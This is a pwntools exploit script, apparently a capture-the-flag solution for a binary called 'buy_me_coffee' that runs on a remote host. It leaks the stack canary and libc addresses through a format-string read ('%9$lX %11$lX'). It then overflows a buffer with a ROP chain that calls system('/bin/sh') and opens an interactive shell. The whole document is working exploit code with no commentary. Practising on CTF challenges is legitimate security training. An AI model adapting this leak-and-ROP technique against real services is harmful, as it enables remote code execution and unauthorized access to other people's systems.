from pwn import *
import logging

#context.log_level='DEBUG'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

gdb_script = f"""
"""

#io = gdb.debug('./buy_me_coffee_patched', gdbscript = gdb_script)
io = remote("34.159.156.124", 31577)

output = io.recvuntil('$')
io.sendline('%9$lX %11$lX') # 9 canary; 11 main+78
output = io.clean(timeout=1)
log.info("Output " + output.decode())
log.success("Canary: " + output.decode().split(' ')[1])
log.success("Main78:" + output.decode().split('W')[0].split(' ')[2])
log.success("Code base: " + str(hex(int(output.decode().split('W')[0].split(' ')[2], 16) - 0x1332)))

canary = int(output.decode().split(' ')[1], 16)
main78 = int(output.decode().split('W')[0].split(' ')[2], 16)

printfAddr = int(output.decode().split(' ')[5].split('\n')[0], 16)
log.success("Printf address: "+ output.decode().split(' ')[5].split('\n')[0])

system_addr = printfAddr - 0xFA00
bin_sh_addr = printfAddr + 0x15292D
#main+78        0x00101332
#pop rdi; ret   0x001013b3
rop_gadget_addr = main78 + 0x81
just_a_ret = main78 - 0x10c

payload = b'A' * 24
payload += p64(canary)
payload += b'B' * 8     #skip saved RBP

payload += p64(just_a_ret)
payload += p64(rop_gadget_addr)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

io.sendline(payload)
io.interactive()